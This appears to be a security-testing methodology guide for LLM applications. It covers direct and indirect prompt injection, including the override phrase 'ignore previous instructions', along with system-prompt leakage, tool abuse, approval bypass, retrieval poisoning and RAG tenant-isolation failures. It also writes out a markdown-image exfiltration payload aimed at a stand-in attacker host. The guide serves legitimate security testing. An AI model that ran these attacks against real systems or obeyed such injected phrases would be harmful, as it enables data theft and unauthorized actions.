---
name: ai-llm
description: Owned methodology for AI/LLM application classes — direct and indirect prompt injection, system-prompt leakage, unauthorized/over-privileged tool invocation, data exfiltration through tools, and RAG/vector-store authorization and tenant-isolation failures. For apps that put an LLM between the user and real actions or data.
---

# AI / LLM Applications

When an app puts an LLM in the request path — especially one with tools, memory,
or retrieval — the model output is untrusted data that reaches interpreters,
tools, and other users. Test the *boundary the model can cross*, not the model's
answers. Manual; `claude-in-chrome` for chat UIs, `_httpcore` for the API.

## Prompt injection

- **Direct** — user input that overrides the system prompt: "ignore previous
  instructions", role-play escapes, delimiter confusion, encoding tricks
  (base64/unicode) that slip past an input filter but are understood by the model.
- **Indirect** — injection via content the model *ingests*, not the user's own
  turn: a web page it browses, a document/email it summarizes, a RAG chunk, a
  filename, a calendar invite. The attacker plants instructions in data the
  victim later asks the model to process. This is the higher-impact class in
  agentic apps and the one canned tests miss.
- **System-prompt / config leakage** — coax out the system prompt, tool
  definitions, or hidden keys; useful as a stepping stone (reveals tool names and
  guardrails to target).

## Tool / action abuse (agentic apps)

The dangerous surface is what the model can *do*, not say:

- **Unauthorized tool invocation** — can an injected instruction make the agent
  call a tool the user didn't intend (send email, delete data, make a purchase,
  hit an internal API)?
- **Over-broad tool permissions / missing per-tool authz** — the agent runs with
  the app's privileges, not the user's; an action the user couldn't perform
  directly succeeds through the agent (**confused deputy** — overlaps
  `idor_and_authz.md` and `multitenancy_and_baas.md`).
- **Data exfiltration through tools** — injection that makes the agent read
  private context and send it out via a tool (a URL fetch to an attacker domain,
  an email, a markdown image `![](http://attacker/?data=...)` rendered by the UI).
- **Approval bypass** — a confirm-before-acting gate that injected text talks the
  agent (or the flow) past.
- **Cross-session / memory leakage** — persistent memory or conversation state
  bleeding between users; credential inheritance across sessions.
- **Output into downstream interpreters** — model output rendered as HTML (XSS,
  see `xss.md`), run as SQL, passed to a shell, or eval'd. The model is now an
  injection *source*; test the sink as you would any injection.

## RAG / knowledge bases / vector stores

- **Document ACL bypass** — retrieval returns chunks from documents the user
  isn't authorized to see (the vector search wasn't scoped to their permissions).
  Ask for content only in a restricted doc and see if it surfaces.
- **Tenant crossover** — one tenant's embeddings retrievable by another; the
  classic multi-tenant vector-store bug.
- **Retrieval poisoning** — plant a document (if you can write to the KB) whose
  content is an indirect-injection payload that fires when retrieved.
- **Metadata / embedding leakage** — source URLs, internal paths, or other
  tenants' snippets leaking through citations or the embedding response.
- **Stale permissions** — a document revoked from a user still retrievable
  because the index wasn't updated.

## Validation bar

A finding is a boundary actually crossed: an injected instruction that caused a
real unauthorized tool action, private data actually exfiltrated, or a RAG query
that returned another user's/tenant's restricted document — reproduced, with the
exact input and the observed action/data. "The model said something it shouldn't"
with no action or data impact is a quality issue, not a security finding, unless
it leaked real restricted data.
